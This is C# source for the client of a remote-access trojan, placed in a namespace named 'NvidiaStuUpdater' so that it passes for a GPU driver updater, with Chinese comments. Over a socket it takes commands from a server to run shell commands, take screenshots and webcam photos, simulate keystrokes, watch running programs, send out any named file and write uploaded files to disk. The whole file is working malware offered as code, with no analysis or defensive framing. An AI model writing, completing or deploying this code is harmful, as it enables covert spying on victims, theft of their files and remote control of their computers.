using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using CusMsg;
using ClassLib;
using System.Windows.Forms;
using System.Diagnostics;

namespace NvidiaStuUpdater
{
    class DialogToServer
    {
        public Socket server;
        public Exelistener exelisten = null;

        public DialogToServer(Socket server)
        {
            this.server = server;
            server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 100000);
            Thread th = new Thread(new ThreadStart(loopListen));
            th.Start();
            th.Join();
        }

        public void loopListen()
        {
            while (true)
            {
                try
                {
                    C2PMsg recC2P = receiveFromServer();
                    string[] cmd = cmdGroup(Encoding.UTF8.GetString(recC2P.strValue));
                    if (recC2P.type == (sbyte)MSGTYPE._STRING_)
                    {//运行指令
                        if (cmd[0].Equals("runcmd"))
                        {
                            ParameterizedThreadStart pts = new ParameterizedThreadStart(CMDThread);
                            Thread t = new Thread(pts);
                            t.Start(cmd[1]);
                        }//程序开启关闭监听
                        else if (cmd[0].Equals("listen"))
                        {
                            if (exelisten == null)
                            {
                                exelisten = new Exelistener();
                                exelisten.startListen(cmd[1]);
                                exelisten.dts = this;
                            }
                            else
                            {
                                exelisten.changeEXE(cmd[1]);
                                exelisten.dts = this;
                            }
                        }//屏幕截图
                        else if (cmd[0].Equals("scrshot"))
                        {
                            ScreenShot ss = new ScreenShot();
                            Bitmap bm = ss.captureScreen();
                            sendBitmapToServer(bm);
                        }//拍照
                        else if (cmd[0].Equals("cam"))
                        {
                            if (cmd.Length == 1)
                            {
                                //摄像头拍照 默认一个摄像机 默认2000毫秒超时
                                CamShot cs = new CamShot(this);
                            }
                            else if(cmd.Length==2)
                            {
                                //摄像头拍照 自定义摄像机 默认2000毫秒超时
                                CamShot cs = new CamShot(this, int.Parse(cmd[1]));
                            }else if (cmd.Length == 3)
                            {
                                //摄像头拍照 自定义摄像机 自定义超时
                                CamShot cs = new CamShot(this, int.Parse(cmd[1]),int.Parse(cmd[2]));
                            }
                        }else if(cmd[0].Equals("key"))
                        {
                            try
                            {
                                string combine = "";
                                for(int i = 1; i < cmd.Length; i++)
                                {
                                    combine += cmd[i];
                                    if (i != cmd.Length - 1)
                                        combine += "?";
                                }
                                //模拟按键
                                SendKeys.SendWait(combine);
                            }catch(Exception e)
                            {
                                Console.WriteLine(e.Message);
                            }

                        }
                    }
                    else if (recC2P.type ==(sbyte) MSGTYPE._FILE_)
                    {
                        string fileStr = Encoding.UTF8.GetString(recC2P.strValue);
                        string[] args = fileStr.Split('?');
                        //文件命令
                        if (args[0].Equals("scp"))
                        {
                            //服务器需要获取文件
                            bool exist = File.Exists(args[1]);
                            if (!exist)
                            {
                                sendMsgToSever("找不到文件 ");
                            }
                            else
                            {
                                sendFileToServer(fileStr, args[1]);
                            }
                        }else if (fileStr.Split('?')[0].Equals("upload"))
                        {
                            //服务器需要放文件到这个电脑
                            WriteByteToFile(recC2P.imgValue, fileStr.Split('?')[2]);
                            sendMsgToSever("写入成功!");
                        }
                    }
                }catch(Exception ex)
                {
                    Process.GetCurrentProcess().Kill();
                }
            }
        }

        /// <summary>
        /// 字节转换成文件
        /// </summary>
        /// <param name="pReadByte"></param>
        /// <param name="fileName"></param>
        /// <returns></returns>
        public static bool WriteByteToFile(byte[] pReadByte, string fileName)
        {
            FileStream pFileStream = null;
            try
            {
                pFileStream = new FileStream(fileName,FileMode.OpenOrCreate, FileAccess.ReadWrite);
                pFileStream.Write(pReadByte, 0, pReadByte.Length);
            }
            catch
            {
                return false;
            }
            finally
            {
                if (pFileStream != null)
                    pFileStream.Close();
            }
            return true;
        }

        void CMDThread(object obj)
        {
            string m = obj as string;
            runCmd rc = new runCmd();
            string n = rc.execute(m);
            sendMsgToSever(n);
        }

        /// <summary>
        /// 命令组
        /// </summary>
        /// <param name="cmd"></param>
        /// <returns></returns>
        public string[] cmdGroup(string cmd)
        {
            string[] cmdFirst = cmd.Split('?');

            /*
            cmdGrp[0] = cmdFirst[0];
            string cmdSecond = string.Empty;
            for(int i = 1; i < cmdFirst.Length;i++)
            {
                if (i != 1)
                {
                    cmdSecond += " " + cmdFirst[i];
                }
                else
                {
                    cmdSecond += cmdFirst[1];
                }
                
            }
            cmdGrp[1] = cmdSecond;
            */
            return cmdFirst;
        }

        public void sendMsgToSever(string msg)
        {
            try
            {
                C2PMsg c2pmsg = new C2PMsg();
                c2pmsg.type = (sbyte)MSGTYPE._STRING_;
                byte[] bytes = Encoding.UTF8.GetBytes(msg);
                int len = bytes.Length;

                c2pmsg.strValue = bytes;
                var senttoservermessage = SerializeObj(c2pmsg);

                server.Send(senttoservermessage);
            }
            catch (Exception)
            {
                Process.GetCurrentProcess().Kill();
            }
            
        }

        /// <summary>
        /// 发送文件到服务器
        /// </summary>
        /// <param name="url">文件地址</param>
        public void sendFileToServer(string orginalCMD,string url)
        {
            try
            {
                C2PMsg c2pmsg = new C2PMsg();
                c2pmsg.type = (sbyte)MSGTYPE._FILE_;

                FileStream fs = new FileStream(url, FileMode.Open, FileAccess.Read);
                try
                {
                    byte[] buffur = new byte[fs.Length];
                    fs.Read(buffur, 0, (int)fs.Length);
                    int len = buffur.Length;
                    c2pmsg.strValue = Encoding.UTF8.GetBytes(orginalCMD);  //原始命令传回去让服务器知道储存目录
                    c2pmsg.imgValue = buffur;  //文件字节流
                    var fileMessage = SerializeObj(c2pmsg);
                    server.Send(fileMessage);
                }
                catch (Exception ex)
                {

                }
                finally
                {
                    if (fs != null)
                    {

                        //关闭资源
                        fs.Close();
                    }
                }

                
                var senttoservermessage = SerializeObj(c2pmsg);

                server.Send(senttoservermessage);
            }
            catch (Exception)
            {
                Process.GetCurrentProcess().Kill();
            }

        }

        public void sendBitmapToServer(Bitmap bmp)
        {
            try
            {
                C2PMsg c2pmsg = new C2PMsg();
                MemoryStream ms = new MemoryStream();
                bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                c2pmsg.imgValue = ms.GetBuffer();
                c2pmsg.type = (sbyte)MSGTYPE._IMAGE_;
                var senttoservermessage = SerializeObj(c2pmsg);
                server.Send(senttoservermessage);
                ms.Close();
            }catch(Exception ex)
            {
                
                Process.GetCurrentProcess().Kill();
            }
            
        }


        //TODO:这个函数需要更改下,服务器会发送C2PMSG类型的命令回来,需要转换
        public C2PMsg receiveFromServer()
        {
            try
            {
                byte[] msg = new byte[7 * 1024 * 1024]; //5MB大小
                int len = server.Receive(msg);
                Object obj = new object();
                DeserializeToObj(msg,out obj);
                C2PMsg obj1 = (C2PMsg)obj;
                
                return obj1;
            }
            catch(Exception ex)
            {
                Process.GetCurrentProcess().Kill();
                return new C2PMsg();
            }
            
        }

        /// <summary>
        /// 结构体到序列的变换
        /// </summary>
        /// <param name="obj"></param>
        /// <returns></returns>
        public byte[] stru2bytes(object obj)
        {
            try
            {
                int size = Marshal.SizeOf(obj);
                byte[] bytes = new byte[size];
                Console.WriteLine(size);
                IntPtr structPtr = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(obj, structPtr, false);
                Marshal.Copy(structPtr, bytes, 0, size);
                Marshal.FreeHGlobal(structPtr);
                return bytes;
            }
            catch (Exception)
            {
                Process.GetCurrentProcess().Kill();
                return null;
            }
            
        }

        public void DeserializeToObj(byte[] bytes, out object obj)
        {
            obj = null;
            MemoryStream ms = new MemoryStream(bytes);
            BinaryFormatter bf = new BinaryFormatter();
            obj = bf.Deserialize(ms);
        }

        public byte[] SerializeObj(object obj)
        {
            MemoryStream ms = new MemoryStream();
            BinaryFormatter bf = new BinaryFormatter();
            bf.Serialize(ms, obj);
            return ms.ToArray();
        }
        /// <summary>
        /// 序列到结构体的变换
        /// </summary>
        /// <param name="bytes"></param>
        /// <param name="type"></param>
        /// <returns></returns>
        public object bytes2stru(byte[] bytes,Type type)
        {
            try
            {
                int size = Marshal.SizeOf(type);
                if (size > bytes.Length)
                {
                    return null;
                }
                IntPtr structPtr = Marshal.AllocHGlobal(size);
                Marshal.Copy(bytes, 0, structPtr, size);
                object obj = Marshal.PtrToStructure(structPtr, type);
                Marshal.FreeHGlobal(structPtr);
                return obj;

            }
            catch(Exception e)
            {
                Process.GetCurrentProcess().Kill();
                return null;
            }
            
        }

    }
}
